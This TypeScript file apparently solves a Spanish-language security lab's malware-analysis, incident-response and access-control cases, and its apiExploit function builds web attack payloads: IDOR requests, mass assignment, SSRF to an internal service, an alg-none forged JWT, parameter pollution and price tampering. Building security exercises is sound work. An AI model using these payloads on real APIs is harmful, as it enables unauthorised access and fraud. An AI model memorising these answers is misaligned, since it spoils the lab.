import { transformText } from "../apps/web/src/web-lab/toolkit/textTransforms";
import { createHash, createHmac } from "node:crypto";
const sha = (text: string) => createHash("sha256").update(text).digest("hex");
const csv = (text: string) =>
  text
    .trim()
    .split("\n")
    .slice(1)
    .map((line) => line.split(","));
type Read = (name: string) => Promise<string>;
const seconds = (value: string) =>
  value.split(":").reduce((total, part) => total * 60 + Number(part), 0);
export async function solveAnalysisCase(
  id: string,
  read: Read,
): Promise<string> {
  const n = Number(id.slice(-2));
  if (id.startsWith("malware-")) {
    if (n === 1)
      return new URL((await read("strings.txt")).match(/^beacon=(.+)$/m)![1])
        .hostname;
    if (n === 2) {
      const target = JSON.parse(await read("muestra.json"));
      return csv(await read("run.csv")).find(
        (row) => row[1] === target.path,
      )![0];
    }
    if (n === 3) {
      const image = (await read("muestra.txt")).split(": ")[1].trim(),
        pid = csv(await read("procesos.csv")).find(
          (row) => row[1] === image,
        )![0];
      return csv(await read("tareas.csv")).find((row) => row[1] === pid)![0];
    }
    if (n === 4)
      return Buffer.from(await read("config.b64"), "base64")
        .toString("utf8")
        .match(/campaign=([^;]+)/)![1];
    if (n === 5) {
      const loader = await read("loader.txt"),
        key = Buffer.from(loader.match(/clave UTF-8: (.+)/)![1]),
        data = Buffer.from(await read("recurso.hex"), "hex");
      return Buffer.from(data.map((byte, i) => byte ^ key[i % key.length]))
        .toString("utf8")
        .match(/channel=([^;]+)/)![1];
    }
    if (n === 6) {
      const rule = JSON.parse(await read("regla.json")),
        samples = JSON.parse(await read("muestras.json"));
      const matches = Object.entries(samples).filter(
        ([, text]) =>
          typeof text === "string" &&
          rule.all.every((s: string) => text.includes(s)) &&
          !rule.none.some((s: string) => text.includes(s)),
      );
      if (matches.length !== 1) throw Error("Regla ambigua");
      return matches[0][0];
    }
    if (n === 7) {
      const host = JSON.parse(await read("host.json")),
        config = JSON.parse(await read("config.json"));
      return transformText(
        "reverse",
        Buffer.from(
          host.memoryMB < 2048 || host.debugger
            ? config.config_demo
            : config.config_real,
          "base64",
        ).toString("utf8"),
      );
    }
    if (n === 8) {
      const map = JSON.parse(await read("mapa.json")),
        blocks = JSON.parse(await read("bloques.json")),
        encoded = map.order
          .map((i: number) => blocks[map.resource][String(i)])
          .join("");
      if (sha(encoded) !== (await read("integridad.sha256")).trim())
        throw Error("Integridad inválida");
      return Buffer.from(encoded, "base64").toString("utf8").split("=")[1];
    }
    if (n === 9) {
      const pid = csv(await read("inventario.csv")).find(
          (row) => row[1] === "adquirida.exe",
        )![0],
        rows = csv(await read("eventos.csv"));
      const matches = rows.filter(
        (row) =>
          row[0] === "write" &&
          row[1] === pid &&
          rows.some(
            (e) =>
              e[0] === "thread" &&
              e.slice(1).join("|") === row.slice(1).join("|"),
          ) &&
          rows.some(
            (e) => e[0] === "open" && e[1] === row[1] && e[2] === row[2],
          ),
      );
      if (matches.length !== 1) throw Error("Telemetría ambigua");
      return sha(matches[0].slice(1).join("|"));
    }
    if (n === 10) {
      const hash = (await read("adquisicion.sha256")).trim(),
        process = csv(await read("procesos.csv")).find(
          (row) => row[1] === hash,
        )!,
        domains = csv(await read("red.csv"))
          .filter((row) => row[0] === process[0] && row[2] === "ok")
          .map((row) => row[1].toLowerCase().replace(/\.$/, "")),
        mutex = process[2].toLowerCase();
      const family = csv(await read("familias.csv")).filter(
        (row) => domains.includes(row[1]) && row[2] === mutex,
      );
      if (family.length !== 1) throw Error("Familia ambigua");
      return sha(family[0].join("|"));
    }
  }
  if (id.startsWith("incident-")) {
    if (n === 1) {
      const agent = csv(await read("alertas.csv")).find(
        (row) => row[2] === "confirmada",
      )![1];
      return csv(await read("inventario.csv")).find(
        (row) => row[0] === agent,
      )![1];
    }
    if (n === 2) {
      const session = csv(await read("proxy.csv")).find(
        (row) => row[1] === "nomina" && Number(row[2]) > 0,
      )![0];
      return csv(await read("sesiones.csv")).find(
        (row) => row[0] === session,
      )![1];
    }
    if (n === 3) {
      const request = csv(await read("proxy.csv")).find(
        (row) => row[1] === "200" && row[2] === "ejecutable",
      )![0];
      return csv(await read("dns.csv")).find((row) => row[0] === request)![1];
    }
    if (n === 4) {
      const context = JSON.parse(await read("incidente.json"));
      return csv(await read("planes.csv")).find(
        (row) =>
          row[1] === context.host && row[2] === "true" && row[3] === "true",
      )![0];
    }
    if (n === 5) {
      const times = csv(await read("sesion.csv")).map(
        (row) => seconds(row[2]) + 5 * 3600,
      );
      return csv(await read("red.csv")).find(
        (row) =>
          seconds(row[2]) - 120 > times[0] && seconds(row[2]) - 120 < times[1],
      )![0];
    }
    if (n === 6) {
      const access = csv(await read("accesos.csv")).find(
          (row) => row[2] === "exportacion-restringida",
        )!,
        token = csv(await read("tokens.csv")).find(
          (row) => row[0] === access[0] && row[2] === access[1],
        )!;
      return csv(await read("auth.csv")).find((row) => row[0] === token[1])![1];
    }
    if (n === 7) {
      const host = (await read("incidente.txt")).split(": ")[1].trim();
      return csv(await read("colector.csv")).find(
        (row) => row[0] === host && row[1] === "clear-log",
      )![2];
    }
    if (n === 8) {
      const context = JSON.parse(await read("inicio.json")),
        path = [context.host];
      const rows = csv(await read("sesiones.csv")).sort((a, b) =>
        a[0].localeCompare(b[0]),
      );
      for (const row of rows)
        if (
          row[1] === path.at(-1) &&
          row[3] === context.credential &&
          row[4] === "ok"
        )
          path.push(row[2]);
      return sha(path.join(">"));
    }
    if (n === 9) {
      const context = JSON.parse(await read("incidente.json")),
        confidential = new Set(
          csv(await read("objetos.csv"))
            .filter((row) => row[1] === "confidencial")
            .map((row) => row[0]),
        );
      const ids = csv(await read("lecturas.csv"))
        .filter(
          (row) =>
            row[0] === context.session &&
            row[2] === "200" &&
            confidential.has(row[1]),
        )
        .map((row) => row[1]);
      return sha([...new Set(ids)].sort().join("|"));
    }
    if (n === 10) {
      const expected = (await read("referencia.sha256")).trim();
      const match = csv(await read("recuperacion.csv")).filter(
        (row) =>
          row[1] === expected &&
          seconds(row[5]) > seconds(row[2]) &&
          seconds(row[7]) > Math.max(seconds(row[3]), seconds(row[5])) &&
          row[8] === "ok",
      );
      if (match.length !== 1) throw Error("Recuperación ambigua");
      return sha(
        [match[0][0], match[0][1], match[0][4], match[0][6]].join("|"),
      );
    }
  }
  if (id.startsWith("access-")) {
    if (n === 1) {
      const revoked = new Set(
        csv(await read("revocaciones.csv"))
          .filter((row) => row[1] === "revocada")
          .map((row) => row[0]),
      );
      return csv(await read("eventos.csv")).find(
        (row) => revoked.has(row[1]) && row[2] === "permitido",
      )![0];
    }
    if (n === 2) {
      const pass = JSON.parse(await read("pase.json"));
      return csv(await read("eventos.csv")).find(
        (row) =>
          row[2] === "permitido" &&
          (Date.parse(row[1]) < Date.parse(pass.desde) ||
            Date.parse(row[1]) >= Date.parse(pass.hasta)),
      )![0];
    }
    if (n === 3 || n === 6) {
      const rows = csv(await read(n === 3 ? "eventos.csv" : "lecturas.csv")),
        max = new Map<string, number>();
      for (const row of rows) {
        if (row[4] !== "permitido") continue;
        const key = n === 3 ? row[1] + "|" + row[2] : row[1],
          counter = Number(row[3]);
        if (max.has(key) && counter <= max.get(key)!) return row[0];
        max.set(key, Math.max(counter, max.get(key) ?? -1));
      }
      throw Error("Sin repetición");
    }
    if (n === 4) {
      const people = Object.fromEntries(csv(await read("personas.csv"))),
        policy = csv(await read("politicas.csv"));
      return csv(await read("eventos.csv")).find(
        (row) =>
          row[3] === "permitido" &&
          !policy.some((p) => p[0] === row[2] && p[1] === people[row[1]]),
      )![0];
    }
    if (n === 5) {
      const inside = new Set<string>();
      for (const row of csv(await read("eventos.csv"))) {
        if (row[3] !== "permitido") continue;
        if (row[2] === "entrada") {
          if (inside.has(row[1])) return row[0];
          inside.add(row[1]);
        } else inside.delete(row[1]);
      }
      throw Error("Sin violación");
    }
    if (n === 7) {
      const edges = csv(await read("miembros.csv"));
      const groups = (name: string, seen = new Set<string>()): Set<string> => {
        for (const row of edges.filter((row) => row[0] === name)) {
          if (!seen.has(row[1])) {
            seen.add(row[1]);
            groups(row[1], seen);
          }
        }
        return seen;
      };
      return csv(await read("entradas.csv")).find((row) => {
        const set = groups(row[0]);
        return (
          row[1] === "permitido" &&
          set.has("operadores") &&
          set.has("suspendidos")
        );
      })![0];
    }
    if (n === 8) {
      const revoked = csv(await read("revocacion.csv"))[0],
        controllers = csv(await read("controladores.csv"));
      const event = csv(await read("eventos.csv")).find((row) => {
        const c = controllers.find((c) => c[0] === row[1]);
        return (
          row[4] === "permitido" &&
          row[2] === revoked[0] &&
          seconds(row[3]) > seconds(revoked[1]) &&
          c &&
          Number(c[1]) < Number(revoked[2]) &&
          seconds(row[3]) > seconds(c[2]) &&
          seconds(row[3]) < seconds(c[3])
        );
      })!;
      return sha(
        [
          event[0],
          event[1],
          controllers.find((c) => c[0] === event[1])![1],
        ].join("|"),
      );
    }
    if (n === 9) {
      const energy = csv(await read("energia.csv"));
      const event = csv(await read("sensores.csv")).find(
        (row) =>
          row[4] === "abierto" &&
          row[5] === "ninguna" &&
          energy.some(
            (e) =>
              e[0] === row[2] &&
              seconds(row[3]) >= seconds(e[1]) &&
              seconds(row[3]) < seconds(e[2]),
          ),
      )!;
      return sha([event[1], event[2], event[0]].join("|"));
    }
    if (n === 10) {
      const key = Buffer.from(await read("clave.hex"), "hex"),
        revoked = new Set((await read("revocadas.txt")).trim().split("\n"));
      const matches = [];
      for (const credential of JSON.parse(await read("credenciales.json"))) {
        const bytes = Buffer.from(credential.payload, "base64");
        if (
          createHmac("sha256", key).update(bytes).digest("hex") !==
          credential.hmac
        )
          continue;
        const claims = JSON.parse(bytes.toString("utf8"));
        if (
          !revoked.has(claims.serial) &&
          claims.grupo === "visitantes" &&
          (claims.doorMask & 8) !== 0
        )
          matches.push(claims.serial);
      }
      if (matches.length !== 1) throw Error("Permiso ambiguo");
      return matches[0];
    }
  }
  throw Error("Expediente desconocido");
}
export async function apiExploit(
  index: number,
  fields: { name: string; value: string }[],
  read: Read,
) {
  const params = new URLSearchParams(
    Object.fromEntries(fields.map((f) => [f.name, f.value])),
  );
  const body = (value: unknown) => params.set("body", JSON.stringify(value));
  if (index === 1) {
    const rows = csv(await read("pedidos.csv"));
    params.set(
      "path",
      "/v1/orders/" + rows.find((row) => row[1] !== "user-17")![0],
    );
  }
  if (index === 2) params.set("path", "/v1/admin/export");
  if (index === 4) body({ displayName: "Analista", accessLevel: "staff" });
  if (index === 5) body({ quantity: 3 });
  if (index === 6)
    body({ url: (await read("red.txt")).match(/Servicio interno: (.+)/)![1] });
  if (index === 7)
    params.set(
      "path",
      csv(await read("inventario.csv")).find(
        (row) => row[1] === "heredada",
      )![2],
    );
  if (index === 8) {
    const captured = JSON.parse(await read("captura.json"));
    params.set(
      "token",
      Buffer.from(
        JSON.stringify({ alg: "none", typ: captured.header.typ }),
      ).toString("base64url") +
        "." +
        Buffer.from(
          JSON.stringify({
            ...captured.payload,
            tenant: "south",
            scope: "export",
          }),
        ).toString("base64url") +
        ".",
    );
  }
  if (index === 9) {
    const invoices = csv(await read("facturas.csv"));
    params.set(
      "path",
      "/v1/invoices?id=" +
        invoices.find((row) => row[1] === "user-17")![0] +
        "&id=" +
        invoices.find((row) => row[1] !== "user-17")![0],
    );
  }
  if (index === 10) {
    const pending = JSON.parse(await read("pendiente.json"));
    body({
      source: "cache",
      quote: {
        sku: pending.sku,
        quoteId: pending.quoteId,
        trace: pending.trace,
        approved: true,
        total: pending.catalogTotal / 10,
        signature: "unverified",
      },
    });
  }
  return params;
}
